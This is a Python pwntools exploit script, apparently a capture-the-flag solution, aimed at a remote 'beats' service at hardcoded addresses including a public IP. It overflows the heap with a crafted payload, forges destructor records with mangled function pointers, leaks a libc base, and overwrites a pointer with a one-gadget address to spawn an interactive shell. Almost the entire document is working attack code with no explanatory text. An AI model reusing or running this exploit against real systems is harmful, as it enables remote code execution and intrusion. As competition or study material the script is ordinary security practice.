#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.8"
port = 8888
host = "18.178.221.5"
port = 4869
context.arch = "amd64"    
r = remote(host,port)


def gen_beats(types,size,data):
    payload = p8(types) + p8(0) + p16(0) + p32(size)
    payload += data
    return payload

def send_beats(payload):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(payload)


n_fake = 0x426110
dtor_addr = 0x428010
dtor2_addr = 0x429010
dtor3_addr = 0x42a010
read_input = 0x401413
write = 0x401150
rip = write
rip = 0x4012d6
arg1 = 0x403fc8
next_dtor = dtor2_addr
lock = 0x00404000
dtor = p64(rip << 0x11) + p64(arg1) + p64(lock) + p64(next_dtor)
overflow = b"\x02"*0xfe8
overflow += (b"z"*0x68 + p64(n_fake-0xfe8)).ljust(0x1000,b"z")
overflow += b'a'*0x470 + p64(n_fake) + b"q"*0x30 + p64(dtor_addr) + b"q"*0x50
overflow += p64(0)*7


arg1 = dtor3_addr
next_dtor = dtor3_addr

dtor2 = p64(read_input << 0x11) + p64(arg1) + p64(lock) + p64(next_dtor)


payload = gen_beats(0x19,0x4,b"a"*0x10 + p8(0x19) + p8(0) + p16(0) + p32(0x4203+int(len(overflow)/8)))
payload += gen_beats(0x19,0x4200,b"x"*(0x21000-8))
payload += p64(0) 
payload += overflow
payload += b"p"*0x9b8
payload += p64(0) + p64(0x1002)
payload += dtor.ljust(0xff0,b"\x00")
payload += p64(0) + p64(0x1002)
payload += dtor2.ljust(0xff0,b"\x00")
payload += p64(0) + p64(0x1002)
send_beats(payload)

r.recvuntil(":")
r.recvuntil("Timeout")
# trigger alarm handler to exit
libc = u64(r.recv(6).ljust(8,b"\x00")) - 0x407d0

print("libc:",hex(libc))
arg1 = dtor3_addr
next_dtor = dtor3_addr
magic = libc + 0x4f432
dtor3 = p64(magic << 0x11) + p64(arg1) + p64(lock) + p64(0)
r.sendline(dtor3)
r.interactive()


